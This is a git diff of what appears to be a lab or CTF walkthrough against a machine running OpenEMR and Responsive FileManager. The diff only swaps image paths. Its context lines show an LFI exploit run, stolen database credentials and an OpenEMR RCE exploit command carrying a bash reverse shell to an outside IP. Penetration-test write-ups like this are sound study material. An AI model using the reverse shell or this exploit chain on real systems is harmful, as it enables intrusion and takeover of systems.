@@ -48,7 +48,7 @@ smb: \> ls
 
 Port 80 shows a medical website:
 
-![](<../../../.gitbook/assets/image%20(3013).png>)
+![](../../../.gitbook/assets/apex-5.png)
 
 SMB enumeration revealed that this website might be running a vulnerable version of OpenEMR, and there are quite a few RCE exploits for OpenEMR.
 
@@ -78,7 +78,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 When we visit `/filemanager`, we can see that it is running Responsive FileManager:
 
-![](<../../../.gitbook/assets/image%20(201).png>)
+![](../../../.gitbook/assets/apex-2.png)
 
 There are a few exploits related to this:
 
@@ -120,11 +120,11 @@ $ python3 49359.py http://192.168.183.145 PHPSESSID=86a4n0gbbc9klrmvq461tnfk8n /
 
 There was something blocking us from reading PHP files here, and its probably the `.htaccess` file. Within the FileManager instance, I noticed that the same PDFs on SMB were present within it.
 
-![](<../../../.gitbook/assets/image%20(1510).png>)
+![](../../../.gitbook/assets/apex-1.png)
 
 The LFI exploit copies and pastes files into directories, and this means that we should be able to read the file from the SMB share. We just need to modify the `paste_clipboard` function within the exploit:
 
-![](<../../../.gitbook/assets/image%20(2875).png>)
+![](../../../.gitbook/assets/apex-4.png)
 
 After changing the directories a few times, I got it within the SMB share:
 
@@ -160,7 +160,7 @@ $dbase  = 'openemr';
 
 Now we have some SQL creds, we can login to the database present.
 
-![](<../../../.gitbook/assets/image%20(606).png>)
+![](../../../.gitbook/assets/apex-6.png)
 
 We can then find the credentials for OpenEMR:
 
@@ -195,10 +195,10 @@ Afterwards, we can run the RCE exploit for OpenEMR:
 $ python2 45161.py -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.184/4444 0>&1' http://192.168.183.145/openemr
 ```
 
-![](<../../../.gitbook/assets/image%20(94).png>)
+![](../../../.gitbook/assets/apex-7.png)
 
 ## Privilege Escalation
 
 The `root` user has the same password as the MySQL database of `thedoctor`:
 
-![](<../../../.gitbook/assets/image%20(2575).png>)
+![](../../../.gitbook/assets/apex-3.png)
